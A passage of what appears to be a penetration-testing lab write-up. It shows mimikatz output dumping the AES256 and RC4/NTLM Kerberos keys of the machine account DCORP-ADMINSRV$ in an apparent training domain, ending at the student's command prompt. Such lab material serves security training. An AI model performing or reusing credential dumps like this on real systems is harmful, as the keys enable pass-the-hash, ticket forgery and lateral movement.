           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-ADMINSRV$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/17/2025 12:34:45 AM
SID               : S-1-5-18

         * Username : dcorp-adminsrv$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
           rc4_hmac_nt       b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old      b5f451985fd34d58d5120816d31b5565
           rc4_md4           b5f451985fd34d58d5120816d31b5565
           rc4_hmac_nt_exp   b5f451985fd34d58d5120816d31b5565
           rc4_hmac_old_exp  b5f451985fd34d58d5120816d31b5565

mimikatz(commandline) # exit
Bye!

C:\Users\student214>
```
